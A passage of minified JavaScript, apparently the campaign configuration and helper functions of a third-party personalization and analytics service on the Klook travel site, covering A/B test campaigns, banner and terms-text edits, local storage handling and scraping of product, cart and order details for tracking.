location.href.replace('\/citi2017', '\/citi2018')","customCss":"","lang":"all_ALL","trigTimeCount":"0","priority":"0","productType":"20","gaEvents":{"impression":"1","join":"1","sales":"0","close":"0","goal":"0"},"isTest":"0","ie8Support":"0","saLogDuration":"336","cookieTime":"14","dailyDisplay":"{\"status\":1,\"start\":\"00:00\",\"end\":\"23:59\",\"days\":[\"all\"]}","platform":"mobile","runDocReady":"0"},{"id":"c53","campName":"|-x-|VEglMjBDYW1wYWlnbiUyMC0lMjBNZXRhJTIwdGFnJTIwZml4JTIwJTdDJTIwRGVza3RvcA==","isActive":"1","activeDateStart":"1518716700","activeDateEnd":"1836323100","locationData":false,"showIn":{"segment":null,"trigger":[26]},"hideIn":null,"locationisActive":"0","targetingCamp":"0","customizationList":[],"customJs":"sQuery(\"meta[property='og\\\\:image']\").attr(\"content\", \"https:\/\/image.useinsider.com\/klook\/c53\/VGx0Lr7G6gymkGo8X1x11519022387.jpg\")","customCss":"","lang":"en_US","trigTimeCount":"0","priority":"0","productType":"20","gaEvents":{"impression":"1","join":"1","sales":"0","close":"1","goal":"0"},"isTest":"0","ie8Support":"0","saLogDuration":"336","cookieTime":"14","dailyDisplay":"{\"status\":1,\"start\":\"00:00\",\"end\":\"23:59\",\"days\":[\"all\"]}","platform":"web","runDocReady":"0"},{"id":"c55","campName":"|-x-|VEglMjBDYW1wYWlnbiUyMC0lMjBNb2JpbGUlMjBCdWclMjBGaXglMjAlN0MlMjBGaXJlZm94","isActive":"1","activeDateStart":"1518791760","activeDateEnd":"1864650960","locationData":false,"showIn":{"trigger":[27],"segment":[28]},"hideIn":null,"locationisActive":"0","targetingCamp":"0","customizationList":[{"type":"css","settings":{"background-image":{"value":"url(http:\/\/res.klook.com\/image\/upload\/v1518704338\/1000_750_mobile_xcyfy3.jpg)","defaultVal":"url(\"https:\/\/res.klook.com\/image\/upload\/v1518181016\/thcurator2018\/20180209_mobile_TH.webp\")"},"text-decoration":{"value":"","defaultVal":"none solid rgb(51, 51, 51)"}},"selectorString":"div#banner","id":"sp-custom-55-1518878196","parentNodeSelector":"body","editUrl":"https:\/\/www.klook.com\/thcurator"},{"type":"css","settings":{"background-image":{"value":"url(http:\/\/res.klook.com\/image\/upload\/v1518704338\/1000_750_mobile_xcyfy3.jpg)","defaultVal":"url(\"http:\/\/res.klook.com\/image\/upload\/v1518704338\/1000_750_mobile_xcyfy3.jpg\")"},"text-decoration":{"value":"","defaultVal":"none solid rgb(51, 51, 51)"}},"selectorString":"div#banner","id":"sp-custom-55-1518878196","parentNodeSelector":"body","editUrl":"https:\/\/www.klook.com\/thcurator"}],"customJs":"sQuery(\"meta[property='og\\\\:image']\").attr(\"content\", \"http:\/\/res.klook.com\/image\/upload\/v1518711332\/526_275_FB_c7mi5d.jpg\")","customCss":".klook-webp.twcurator_II_m#banner {\r\nbackground-image:url(\"http:\/\/res.klook.com\/image\/upload\/v1518704338\/1000_750_mobile_xcyfy3.jpg\")\r\n}\r\n\r\n.twcurator_II_m#banner {\r\nbackground-image:url(\"http:\/\/res.klook.com\/image\/upload\/v1518704338\/1000_750_mobile_xcyfy3.jpg\")\r\n}","lang":"all_ALL","trigTimeCount":"0","priority":"0","productType":"20","gaEvents":{"impression":"1","join":"1","sales":"0","close":"1","goal":"0"},"isTest":"1","ie8Support":"0","saLogDuration":"336","cookieTime":"14","dailyDisplay":"{\"status\":1,\"start\":\"00:00\",\"end\":\"23:59\",\"days\":[\"all\"]}","platform":"mobile","runDocReady":"0"},{"id":"c61","campName":"|-x-|VmFyaWF0aW9uJTIwLSUyMDcwNTEzNTI1","isActive":"1","activeDateStart":"1519012920","activeDateEnd":"1584504120","locationData":false,"showIn":{"segment":null,"trigger":[32]},"hideIn":null,"locationisActive":"0","targetingCamp":"0","customizationList":[{"type":"elementAttr","attrs":[{"key":"style","val":"background-image: url(\"http:\/\/res.klook.com\/image\/upload\/v1519099311\/Airasia-KV_657x383px_wyjkrd.jpg\"); background-size: contain;","type":"changed","oldVal":"background-image: url(\"https:\/\/res.klook.com\/image\/upload\/q_80\/v1508744423\/Airasia-Mobile_657x383px_k6exxx.jpg\"); background-size: contain;"}],"selectorString":"body > div:eq(0) > div:eq(0) > div","id":"sp-custom-61-1519099994844","parentNodeSelector":"body > div:eq(0) > div:eq(0)","editUrl":"https:\/\/www.klook.com\/airasiabig"},{"type":"insertedHTML","insertOption":"elementAfter","html":"<li>Terms and conditions of Klook applies. <\/li>","selectorString":"body > div:eq(0) > div:eq(4) > ol > li:eq(16)","id":"sp-custom-61-1519100090851","parentNodeSelector":"body > div:eq(0) > div:eq(4) > ol","editUrl":"https:\/\/www.klook.com\/airasiabig"},{"type":"changedText","html":"The Campaign shall run from 15 February 2018 00.00 (GMT +8) until 31 May 2018 23.59 (GMT +8) (\u201cCampaign Period\u201d) unless advised otherwise by the Organisers. The Organisers reserve the right to amend or extend the duration of the Campaign at any time as deemed fit.","selectorString":"body > div:eq(0) > div:eq(4) > ol > li:eq(3)","id":"sp-custom-61-1519100123346","parentNodeSelector":"body > div:eq(0) > div:eq(4) > ol","editUrl":"https:\/\/www.klook.com\/airasiabig"},{"type":"changedText","html":"A. Must be an existing BIG member (having subscribed and registered for membership and rewards program operated by BIG under the name \" BIG Loyalty \") and have a unique registration number known as the \" BIG Member ID\" issued by BIG at the point of participation in the Campaign;\n","selectorString":"body > div:eq(0) > div:eq(4) > ol > ul > li:eq(0)","id":"sp-custom-61-1519100235642","parentNodeSelector":"body > div:eq(0) > div:eq(4) > ol > ul","editUrl":"https:\/\/www.klook.com\/airasiabig"},{"type":"remove","selectorString":"body > div:eq(0) > div:eq(4) > ol > ul > li:eq(2)","id":"sp-custom-61-1519100283341","parentNodeSelector":"body > div:eq(0) > div:eq(4) > ol > ul","editUrl":"https:\/\/www.klook.com\/airasiabig"},{"type":"remove","selectorString":"body > div:eq(0) > div:eq(4) > ol > ul > li:eq(2)","id":"sp-custom-61-1519100309513","parentNodeSelector":"body > div:eq(0) > div:eq(4) > ol > ul","editUrl":"https:\/\/www.klook.com\/airasiabig"},{"type":"remove","selectorString":"body > div:eq(0) > div:eq(4) > ol > ul > li:eq(3)","id":"sp-custom-61-1519100335319","parentNodeSelector":"body > div:eq(0) > div:eq(4) > ol > ul","editUrl":"https:\/\/www.klook.com\/airasiabig"},{"type":"changedText","html":"I. Osaka Visitors' Ticket + HARUKAS 300 Observatory","selectorString":"body > div:eq(0) > div:eq(4) > ol > ul > li:eq(4) > p:eq(1)","id":"sp-custom-61-1519100405126","parentNodeSelector":"body > div:eq(0) > div:eq(4) > ol > ul > li:eq(4)","editUrl":"https:\/\/www.klook.com\/airasiabig"},{"type":"changedText","html":"II. Hanbok Rental Experience Seoul","selectorString":"body > div:eq(0) > div:eq(4) > ol > ul > li:eq(4) > p:eq(2)","id":"sp-custom-61-1519100423479","parentNodeSelector":"body > div:eq(0) > div:eq(4) > ol > ul > li:eq(4)","editUrl":"https:\/\/www.klook.com\/airasiabig"},{"type":"changedText","html":"III. Everland Seoul","selectorString":"body > div:eq(0) > div:eq(4) > ol > ul > li:eq(4) > p:eq(3)","id":"sp-custom-61-1519100442617","parentNodeSelector":"body > div:eq(0) > div:eq(4) > ol > ul > li:eq(4)","editUrl":"https:\/\/www.klook.com\/airasiabig"},{"type":"changedText","html":"IV. Chasing Cherry Blossoms Tour in Seoul","selectorString":"body > div:eq(0) > div:eq(4) > ol > ul > li:eq(4) > p:eq(4)","id":"sp-custom-61-1519100462717","parentNodeSelector":"body > div:eq(0) > div:eq(4) > ol > ul > li:eq(4)","editUrl":"https:\/\/www.klook.com\/airasiabig"},{"type":"changedText","html":"- One-off 300 BIG Points for 1st time purchase at Dedicated Website by new KLOOK users with minimum order of USD10 in a single transaction.","selectorString":"body > div:eq(0) > div:eq(4) > ol > ul > li:eq(4) > p:eq(6)","id":"sp-custom-61-1519100494162","parentNodeSelector":"body > div:eq(0) > div:eq(4) > ol > ul > li:eq(4)","editUrl":"https:\/\/www.klook.com\/airasiabig"},{"type":"changedText","html":"The award of BIG Points will be credited to the Participant's BIG member account within thirty (30) days (or any other period as the Organisers deem necessary) of the Successful Order subject to the Organisers receiving all necessary information as deemed necessary.","selectorString":"body > div:eq(0) > div:eq(4) > ol > li:eq(6)","id":"sp-custom-61-1519100522317","parentNodeSelector":"body > div:eq(0) > div:eq(4) > ol","editUrl":"https:\/\/www.klook.com\/airasiabig"},{"type":"changedText","html":"BIG Points are not exchangeable and\/or transferable and cannot be exchanged or redeemed for cash. BIG Points and BIG Members are subject to the BIG Membership Terms and Conditions. ","selectorString":"body > div:eq(0) > div:eq(4) > ol > li:eq(9)","id":"sp-custom-61-1519100543333","parentNodeSelector":"body > div:eq(0) > div:eq(4) > ol","editUrl":"https:\/\/www.klook.com\/airasiabig"},{"type":"remove","selectorString":"body > div:eq(0) > div:eq(4) > ol > ul > li:eq(4)","id":"sp-custom-61-1519115467727","parentNodeSelector":"body > div:eq(0) > div:eq(4) > ol > ul","editUrl":"https:\/\/www.klook.com\/airasiabig"},{"type":"insertedHTML","insertOption":"elementAfter","html":"<li>C. Participants who fulfil the Campaign Requirements and made Successful Orders (excluding taxes and shipping costs) will be awarded BIG Points at the following rate:\n                    <p>- 10 BIG Points for every USD1 spent on the following activities at Dedicated Website;<\/p>\n                    <p style=\"padding-left: 20px\">I. Osaka Visitors' Ticket + HARUKAS 300 Observatory<\/p>\n                    <p style=\"padding-left: 20px\">II. Hanbok Rental Experience Seoul<\/p>\n                    <p style=\"padding-left: 20px\">III. Everland Seoul<\/p>\n                    <p style=\"padding-left: 20px\">IV. Chasing Cherry Blossoms Tour in Seoul<\/p>\n                    <p>- 4 BIG Points for every USD1 spent at Dedicated Website;<\/p>\n                    <p>- One-off 300 BIG Points for 1st time purchase at Dedicated Website by new KLOOK users with minimum order of USD10 in a single transaction.<\/p>\n                <\/li>","selectorString":"body > div:eq(0) > div:eq(4) > ol > ul > li:eq(1)","id":"sp-custom-61-1519115605017","parentNodeSelector":"body > div:eq(0) > div:eq(4) > ol > ul","editUrl":"https:\/\/www.klook.com\/airasiabig"},{"type":"remove","selectorString":"body > div:eq(0) > div:eq(4) > ol > ul > li:eq(5)","id":"sp-custom-61-1519115959915","parentNodeSelector":"body > div:eq(0) > div:eq(4) > ol > ul","editUrl":"https:\/\/www.klook.com\/airasiabig"}],"customJs":"","customCss":"","lang":"en_US","trigTimeCount":"0","priority":"0","productType":"20","gaEvents":{"impression":"1","join":"1","sales":"0","close":"1","goal":"0"},"isTest":"0","ie8Support":"0","saLogDuration":"336","cookieTime":"14","dailyDisplay":"{\"status\":1,\"start\":\"00:00\",\"end\":\"23:59\",\"days\":[\"all\"]}","platform":"mobile","runDocReady":"0"},{"id":"c74","campName":"|-x-|VmFyaWF0aW9uJTIwLSUyMDE0MTYwNTIx","isActive":"1","activeDateStart":"1521004860","activeDateEnd":"1523683260","locationData":false,"showIn":{"segment":null,"trigger":[40]},"hideIn":null,"locationisActive":"0","targetingCamp":"0","customizationList":[],"customJs":"window.abTest_ws1042 && window.abTest_ws1042.option()","customCss":"","lang":"all_ALL","trigTimeCount":"0","priority":"0","productType":"20","gaEvents":{"impression":"1","join":"1","sales":"0","close":"1","goal":"0"},"isTest":"0","ie8Support":"0","saLogDuration":"336","cookieTime":"14","dailyDisplay":"{\"status\":1,\"start\":\"00:00\",\"end\":\"23:59\",\"days\":[\"all\"]}","platform":"web","runDocReady":"0"},{"id":"c17","campName":"|-x-|QUFCSUclMjBUJTI2QyUyME1vZGlmaWNhdGlvbi1Db250cm9sJTIwR3JvdXAlMjAlMjhpZCUzQTklMjk=","isActive":"1","activeDateStart":"1513072920","activeDateEnd":"1609495320","locationData":false,"showIn":{"segment":null,"trigger":[6]},"hideIn":null,"locationisActive":"0","targetingCamp":"0","customizationList":false,"customJs":"1==1","customCss":"","lang":"en_US","trigTimeCount":"0","priority":"0","productType":"20","gaEvents":{"impression":"0","join":"0","sales":"0","close":"0","goal":"0"},"isTest":"0","ie8Support":"0","saLogDuration":"336","cookieTime":"14","dailyDisplay":"{\"status\":1,\"start\":\"00:00\",\"end\":\"23:59\",\"days\":[\"all\"]}","platform":"web","runDocReady":"0"},{"id":"c24","campName":"|-x-|UmVkaXJlY3RpbmclMjBVc2VycyUyMHRvJTIwJTJGY2l0aTIwMTglMjAlN0MlMjBEZXNrdG9wLUNvbnRyb2wlMjBHcm91cCUyMCUyOGlkJTNBMTUlMjk=","isActive":"1","activeDateStart":"1514736000","activeDateEnd":"1769771640","locationData":false,"showIn":{"segment":null,"trigger":[13]},"hideIn":null,"locationisActive":"0","targetingCamp":"0","customizationList":false,"customJs":"1==1","customCss":"","lang":"all_ALL","trigTimeCount":"0","priority":"0","productType":"20","gaEvents":{"impression":"1","join":"1","sales":"0","close":"0","goal":"0"},"isTest":"0","ie8Support":"0","saLogDuration":"336","cookieTime":"14","dailyDisplay":"{\"status\":1,\"start\":\"00:00\",\"end\":\"23:59\",\"days\":[\"all\"]}","platform":"web","runDocReady":"0"},{"id":"c28","campName":"|-x-|UmVkaXJlY3RpbmclMjBVc2VycyUyMHRvJTIwJTJGY2l0aTIwMTglMjAlN0MlMjBNb2JpbGUtQ29udHJvbCUyMEdyb3VwJTIwJTI4aWQlM0ExNyUyOQ==","isActive":"1","activeDateStart":"1514743080","activeDateEnd":"1798826280","locationData":false,"showIn":{"segment":null,"trigger":[16]},"hideIn":null,"locationisActive":"0","targetingCamp":"0","customizationList":false,"customJs":"1==1","customCss":"","lang":"all_ALL","trigTimeCount":"0","priority":"0","productType":"20","gaEvents":{"impression":"1","join":"1","sales":"0","close":"0","goal":"0"},"isTest":"0","ie8Support":"0","saLogDuration":"336","cookieTime":"14","dailyDisplay":"{\"status\":1,\"start\":\"00:00\",\"end\":\"23:59\",\"days\":[\"all\"]}","platform":"mobile","runDocReady":"0"},{"id":"c52","campName":"|-x-|VEglMjBDYW1wYWlnbiUyMC0lMjBNZXRhJTIwdGFnJTIwZml4JTIwJTdDJTIwRGVza3RvcC1Db250cm9sJTIwR3JvdXAlMjAlMjhpZCUzQTI4JTI5","isActive":"1","activeDateStart":"1518716700","activeDateEnd":"1836323100","locationData":false,"showIn":{"segment":null,"trigger":[26]},"hideIn":null,"locationisActive":"0","targetingCamp":"0","customizationList":false,"customJs":"1==1","customCss":"","lang":"en_US","trigTimeCount":"0","priority":"0","productType":"20","gaEvents":{"impression":"1","join":"1","sales":"0","close":"1","goal":"0"},"isTest":"0","ie8Support":"0","saLogDuration":"336","cookieTime":"14","dailyDisplay":"{\"status\":1,\"start\":\"00:00\",\"end\":\"23:59\",\"days\":[\"all\"]}","platform":"web","runDocReady":"0"},{"id":"c54","campName":"|-x-|VEglMjBDYW1wYWlnbiUyMC0lMjBNb2JpbGUlMjBCdWclMjBGaXglMjBDb3B5LUNvbnRyb2wlMjBHcm91cCUyMCUyOGlkJTNBMjklMjk=","isActive":"1","activeDateStart":"1518791760","activeDateEnd":"1864650960","locationData":false,"showIn":{"trigger":[27],"segment":[28]},"hideIn":null,"locationisActive":"0","targetingCamp":"0","customizationList":false,"customJs":"1==1","customCss":"","lang":"all_ALL","trigTimeCount":"0","priority":"0","productType":"20","gaEvents":{"impression":"1","join":"1","sales":"0","close":"1","goal":"0"},"isTest":"1","ie8Support":"0","saLogDuration":"336","cookieTime":"14","dailyDisplay":"{\"status\":1,\"start\":\"00:00\",\"end\":\"23:59\",\"days\":[\"all\"]}","platform":"mobile","runDocReady":"0"},{"id":"c59","campName":"|-x-|QUFCSUclMjBLViUyMCUyQiUyMFQlMjZDJTIwVXBkYXRlJTIwJTI4RmViJTIwMTglMjktQ29udHJvbCUyMEdyb3VwJTIwJTI4aWQlM0EzMSUyOQ==","isActive":"1","activeDateStart":"1519012920","activeDateEnd":"1584504120","locationData":false,"showIn":{"segment":null,"trigger":[32]},"hideIn":null,"locationisActive":"0","targetingCamp":"0","customizationList":false,"customJs":"1==1","customCss":"","lang":"en_US","trigTimeCount":"0","priority":"0","productType":"20","gaEvents":{"impression":"1","join":"1","sales":"0","close":"1","goal":"0"},"isTest":"0","ie8Support":"0","saLogDuration":"336","cookieTime":"14","dailyDisplay":"{\"status\":1,\"start\":\"00:00\",\"end\":\"23:59\",\"days\":[\"all\"]}","platform":"mobile","runDocReady":"0"},{"id":"c73","campName":"|-x-|U2hvcHBpbmclMjBDYXJ0JTIwU2hvd2luZyUyMFNhdmVkJTIwQW1vdW50LUNvbnRyb2wlMjBHcm91cCUyMCUyOGlkJTNBMzclMjk=","isActive":"1","activeDateStart":"1521004860","activeDateEnd":"1523683260","locationData":false,"showIn":{"segment":null,"trigger":[40]},"hideIn":null,"locationisActive":"0","targetingCamp":"0","customizationList":false,"customJs":"1==1","customCss":"","lang":"all_ALL","trigTimeCount":"0","priority":"0","productType":"20","gaEvents":{"impression":"1","join":"1","sales":"0","close":"1","goal":"0"},"isTest":"0","ie8Support":"0","saLogDuration":"336","cookieTime":"14","dailyDisplay":"{\"status\":1,\"start\":\"00:00\",\"end\":\"23:59\",\"days\":[\"all\"]}","platform":"web","runDocReady":"0"}],gaCustomVar:1,gaIsActiveCustom:0,gaServiceIsActive:1,gaNonInteraction:1,userSegments:{},gaDataLayerIsActive:0,gaDataLayerSettings:false,ajsData:{},bounceExcludeList:[""],bounceExcludeLeft:-1,bounceExcludeRight:75,defaultVelocity:200,lang:[],spLang:'',storageType:'localStorage',conditionCheckList:[],campCallbacks:[],userBounced:false,setAddCartCountFired:false,logsStack:{},_bindedEvents:{},coeff:{"ecommerce":true,"v":null,"i":null,"t":null,"tMobile":null,"f":{}},customUserAttributes:[],customChannelsTag:[],adwordsApiTags:[],siteUrl:'https://www.klook.com',urlParamSep:1,decryptCampName:function(campName){if(campName.indexOf('|-x-|')===0){return decodeURIComponent(window.atob(campName.substring(5)));}
return campName;},loadFramelessScripts:function(scripts){var _arr=sQuery.map(scripts,function(script){return sQuery.ajax({dataType:'script',cache:true,url:spApi.staticUrl+'js/libraries/'+script});});_arr.push(sQuery.Deferred(function(deferred){sQuery(deferred.resolve);}));return sQuery.when.apply(sQuery,_arr);},loadJsonFile:function(fileName,callback){try{var callbackName='jsonpCallback'+(Math.random().toString(16)+'000000000').substr(2,8);this[callbackName]=function(){};sQuery.ajax({url:spApi.apiUrl+'ajax.php?t=getJSONFile',data:{file:fileName,callback:callbackName},contentType:'application/json',dataType:'jsonp',jsonpCallback:callbackName,success:function(data){if(typeof callback==='function'){callback(data);}}});}catch(err){spApi.errLog(err,{logType:'Load Frameless Json File Error',bugType:'product',extraData:{'function':'loadFramlessJsonFile'}});}},getUrl:function(){return window.location.href;},getAllCamps:function(){return spApi.concat(spApi.camps.concat(spApi.customizationCamps),spApi.webPushes);},existsStorageData:function(keyString){var exists=false;var allData=spApi.allStorageData();sQuery.each(allData,function(i,obj){var key=obj.key;if(key.indexOf(keyString)!==-1){exists=true;}});return exists;},allStorageData:function(){var pairs=[];try{if(spApi.storageType=='cookie'){var allData=document.cookie.split(';');sQuery.each(allData,function(i,v){var cookie=v.split('=');pairs.push({'key':sQuery.trim(cookie[0]),'value':cookie[1]});});}
else if(spApi.storageType=='localStorage'){var allData={};for(var i=0;i<window.localStorage.length;i++){var dataKey=window.localStorage.key(i);allData[dataKey]=window.localStorage.getItem(dataKey);}
sQuery.each(allData,function(key,val){try{var obj=JSON.parse(val);if(typeof obj['_expires']!=='undefined'&&obj['_expires']>Date.now()){pairs.push({'key':key,'value':obj['data']});}}
catch(e){pairs.push({'key':key,'value':val});}});}}catch(err){spApi.errLog(err,{logType:'All Storage Data Error',bugType:'partner',extraData:{'function':'storageData'}});}
return pairs;},storageData:function(name,content,expireDate,callback){try{content=content!=null&&typeof content==='object'?JSON.stringify(content):content;if(spApi.storageType=='cookie'){if(typeof content==='undefined'){return sQuery.cookie(name);}else{sQuery.cookie(name,content,expireDate);}}else if(spApi.storageType=='localStorage'){if(typeof content==='undefined'){var currDate=new Date().getTime();var storageContent=spApi.localStorageGet(name);try{storageContent=JSON.parse(storageContent);if(storageContent!=null&&storageContent._expires>currDate){return storageContent.data;}else{var obj={action:'delete',name:name};spApi.worker.asyncPM('storageData',obj,callback);localStorage.removeItem(name);return null;}}
catch(e){return storageContent;}}else if(content==null){var obj={action:'delete',name:name};spApi.worker.asyncPM('storageData',obj,callback);localStorage.removeItem(name);return null;}else{var expires=typeof expireDate!=='undefined'?expireDate.expires:1;if(typeof expires==='object'){expires=expires.getTime();}else{var dateObj=new Date().getTime();dateObj+=1000*60*60*24*Number(expires)+10000;expires=dateObj;}
var stObj=new Object();stObj.data=typeof content==='object'?JSON.stringify(content):content;stObj._expires=expires;spApi.localStorageSet(sQuery.trim(name),JSON.stringify(stObj));if(typeof window.insdrSV==='undefined'){var version=sQuery.cookie('insdrSV')!=null?Number(sQuery.cookie('insdrSV')):0;version++;spApi.localStorageSet('insdrSV',version);sQuery.cookie('insdrSV',version,{expires:365,path:'/',domain:cookieDomain});window.insdrSV=version;}
var obj={action:'write',name:name,content:JSON.stringify(stObj)};spApi.worker.asyncPM('storageData',obj,callback);}}}catch(err){spApi.errLog(err,{logType:'Data Storage Error',bugType:'partner',extraData:{'function':'storageData'}});}},_systemRuleError:function(name,func,err){var errLogStr=JSON.stringify(spApi.errLogs)||'';if(errLogStr.indexOf('"ruleName":"'+name+'"')!=-1)return;spApi.errLog(err,{logType:'System Rule Error',bugType:'partner',extraData:{ruleName:name,ruleContent:func.toString()}});},getPaidProducts:function(){try{var funcString=spApi.isMobileBrowser()?"(function(){\nvar products=[];sQuery('.type_list .type').each(function(index,elem){products.push({name:encodeURIComponent(sQuery.trim(pkg_info.seo_url))||'',img:'',url:window.location.href.replace(\"tobook\",\"activity\"),id:window.location.href.match(\/([^\\\/]*)\\\/*$\/)[1]||'',time:spApi.getTime(),price:parseFloat(sQuery('.amount',elem).text())||0,quantity:parseInt(sQuery.trim(sQuery('.num',elem).text())||1),cats:[]});});for(var k=0;k<products.length;k++){products[k]=spApi.getExchangeRate(spApi.getCurrency(),spApi.preferredCurrency,products[k],'price');}\nreturn products;})()":"(function(){\nvar products=[];sQuery('#cart_list table:first tr').each(function(index,elem){products.push({name:encodeURIComponent(sQuery.trim(sQuery('a:eq(1)',elem).text()))||'',img:sQuery('img',elem).attr('src')||'',url:window.location.origin+sQuery('a:eq(1)',elem).attr('href'),id:sQuery(this).attr('data-activity-id')||'',time:spApi.getTime(),price:parseFloat(sQuery(this).attr('data-price')),quantity:parseInt(sQuery('.j_price_td .j_a_l .num',elem).text()||1)});});for(var k=0;k<products.length;k++){products[k]=spApi.getExchangeRate(spApi.getCurrency(),spApi.preferredCurrency,products[k],'price');}\nreturn products;})()";return spApi.e(funcString);}catch(err){spApi._systemRuleError('getPaidProducts',funcString,err);}},getCurrentProduct:function(){try{var funcString=spApi.isMobileBrowser()?"(function(){\nvar p={};if(typeof activityInfo!=='object')\nvar pName=activityInfo.seo_url||'';p.id=sQuery('.wish i').attr('data-id')||'';p.name=encodeURIComponent(sQuery.trim(pName));p.img='';p.price=parseFloat(sQuery('.price_now').text()||0);p.url=window.location.href.split('-')[0];p.cats=[];p.quantity=1;p.exchange='from '+spApi.getCurrency()+' to '+spApi.preferredCurrency;return spApi.getExchangeRate(spApi.getCurrency(),spApi.preferredCurrency,p,'price');})()":"(function(){\nvar p={};p.id=sQuery('.hover_color i').attr('data-id')||'';p.name=encodeURIComponent(sQuery.trim(sQuery('.header h1').text()));p.img=encodeURI(sQuery('#description .img:first img').attr('src')||'');p.price=parseFloat(sQuery('.pay_info .price strong').text().replace(\/[^0-9.]\/g,''));p.url=window.location.href.split('-')[0];p.cats=spApi.getProductCategories();p.quantity=1;p.exchange='from '+spApi.getCurrency()+' to '+spApi.preferredCurrency;return spApi.getExchangeRate(spApi.getCurrency(),spApi.preferredCurrency,p,'price');})()";return spApi.e(funcString);}catch(err){spApi._systemRuleError('getCurrentProduct',funcString,err);}},getTotalCartAmount:function(){try{var funcString=spApi.isMobileBrowser()?"(function(){\nreturn spApi.getExchangeRate(spApi.getCurrency(),spApi.preferredCurrency,parseFloat(sQuery('.amount:last').text()||0),'');})()":"(function(){\nreturn spApi.getExchangeRate(spApi.getCurrency(),spApi.preferredCurrency,parseFloat(sQuery('#totalPcice').text()||0),'');})()";return spApi.e(funcString);}catch(err){spApi._systemRuleError('getTotalCartAmount',funcString,err);}},isOnCartPage:function(){try{var funcString=spApi.isMobileBrowser()?"(function(){\nreturn sQuery('#pkj_box').exists()&&sQuery('.add_cart').exists();})()":"(function(){\nreturn spApi.hasParameter('shoppingcart')&&sQuery('#shopping_cart_table_head').exists();})()";return spApi.e(funcString);}catch(err){spApi._systemRuleError('isOnCartPage',funcString,err);}},isOnAfterPaymentPage:function(){try{var funcString="(function(){\nreturn spApi.hasParameter('payment\/success')||spApi.hasParameter('insTest=123');})()";return spApi.e(funcString);}catch(err){spApi._systemRuleError('isOnAfterPaymentPage',funcString,err);}},isOnProductPage:function(){try{var funcString=spApi.isMobileBrowser()?"(function(){\nreturn sQuery('.head_info').exists();})()":"(function(){\nreturn sQuery('.g_main.activity').exists();})()";return spApi.e(funcString);}catch(err){spApi._systemRuleError('isOnProductPage',funcString,err);}},getProductCategories:function(){try{var funcString=spApi.isMobileBrowser()?"(function(){\nvar categories=[];sQuery('nav[itemprop=\"breadcrumb\"] span:not(:first):not(:has(>i))').each(function(index,element){categories.push(sQuery.trim(sQuery(this).text()));})\nreturn categories;})()":"(function(){\nvar categories=[];sQuery('nav[itemprop=\"breadcrumb\"] span:not(:first,.left-arrow,:last)').each(function(index,element){categories.push(sQuery.trim(sQuery(this).text()));})\nreturn categories;})()";return spApi.e(funcString);}catch(err){spApi._systemRuleError('getProductCategories',funcString,err);}},spAddToCart:function(){try{var funcString=spApi.isMobileBrowser()?"(function(){\nvar spAddToCartHandler={};spAddToCartHandler.addCartButton=sQuery('.select_btn').on(\"click\",function(){spApi.setProductCategory();if(typeof(spApi.setCartTargetingRules)!=\"undefined\"){spApi.setCartTargetingRules();}});})()":"(function(){\nvar spAddToCartHandler={};spAddToCartHandler.addCartButton=sQuery('button[data-role=\"add-cart\"]').on(\"click\",function(){spApi.setProductCategory();if(typeof(spApi.setCartTargetingRules)!=\"undefined\"){spApi.setCartTargetingRules();}});})()";return spApi.e(funcString);}catch(err){spApi._systemRuleError('spAddToCart',funcString,err);}},getOrderId:function(){try{var funcString=spApi.isMobileBrowser()?"(function(){\nreturn sQuery.trim(sQuery('.order_detail span').text());})()":"(function(){\nreturn sQuery.trim(sQuery('.booking_num p:first span').text());})()";return spApi.e(funcString);}catch(err){spApi._systemRuleError('getOrderId',funcString,err);}},getLang:function(lang){try{var funcString="(function(){\nvar lang=sQuery.trim(sQuery('body').attr('class').split(' ',1));if(lang=='lang_en'){return'en_US';}else if(lang=='lang_zh-CN'){return'zh-cn'}else if(lang=='lang_zh-HK'||lang=='lang_zh-TW'){return'zh_tw'}else if(lang=='lang_ko'){return'ko_KR'}else if(lang=='lang_th'){return'th_TH';}else if(lang=='lang_vi'){return'vi_VN';}else if(lang=='lang_id'){return'id_ID';}else{return'en_US';}})()";return spApi.e(funcString);}catch(err){spApi._systemRuleError('getLang',funcString,err);}},useCouponButton:function(){try{var funcString="(function(){\nvar useCouponButton=new Object();useCouponButton.button=\"\";useCouponButton.buttonClick=\"\";useCouponButton.couponInputText=\"\";useCouponButton.couponInput=\"\";return useCouponButton})()";return spApi.e(funcString);}catch(err){spApi._systemRuleError('useCouponButton',funcString,err);}},isUserLoggedIn:function(){try{var funcString=spApi.isMobileBrowser()?"(function(){\nreturn sQuery('#useImg').attr('href')=='\/id\/home';})()":"(function(){\nreturn sQuery('#userInfo').exists();})()";return spApi.e(funcString);}catch(err){spApi._systemRuleError('isUserLoggedIn',funcString,err);}},isOnRegSuccessPage:function(){try{var funcString="(function(){\nreturn false})()";return spApi.e(funcString);}catch(err){spApi._systemRuleError('isOnRegSuccessPage',funcString,err);}},getSearchKeyWords:function(){try{var funcString="(function(){\nreturn spApi.getParameter('keyword')||'';})()";return spApi.e(funcString);}catch(err){spApi._systemRuleError('getSearchKeyWords',funcString,err);}},isOnMainPage:function(){try{var funcString=spApi.isMobileBrowser()?"(function(){\nreturn sQuery('.m_card_list.hot_destination').exists();})()":"(function(){\nreturn sQuery('.intro').exists();})()";return spApi.e(funcString);}catch(err){spApi._systemRuleError('isOnMainPage',funcString,err);}},isCouponCodeApplied:function(){try{var funcString="(function(){\nreturn true;})()";return spApi.e(funcString);}catch(err){spApi._systemRuleError('isCouponCodeApplied',funcString,err);}},isOnCouponPage:function(){try{var funcString="(function(){\nreturn spApi.hasParameter('cart');})()";return spApi.e(funcString);}catch(err){spApi._systemRuleError('isOnCouponPage',funcString,err);}},isOnCategoryPage:function(){try{var funcString=spApi.isMobileBrowser()?"(function(){\nreturn sQuery('.m_card_list').exists()&&spApi.hasParameter('city');})()":"(function(){\nreturn sQuery('.forest_list').exists()&&spApi.hasParameter('city');})()";return spApi.e(funcString);}catch(err){spApi._systemRuleError('isOnCategoryPage',funcString,err);}},getCategories:function(){try{var funcString=spApi.isMobileBrowser()?"(function(){\nvar categories=[];categories.push((window.location.href.split('id\/')[1]||'').split('\/')[0]||'');if(spApi.isOnCategoryPage()&&sQuery('.swiper-wrapper').exists()){categories.push(sQuery('.j_first_title > span').text());categories.push(sQuery.trim(sQuery('.swiper-wrapper .swiper-slide-active').text()));}\nreturn categories;})()":"(function(){\nvar categories=[];categories.push((window.location.href.split('id\/')[1]||'').split('\/')[0]);sQuery('.j_kind_fixed .bread_crumbs .t_gray a').each(function(index,element){categories.push(sQuery.trim(sQuery(element).text()));})\nreturn categories;})()";return 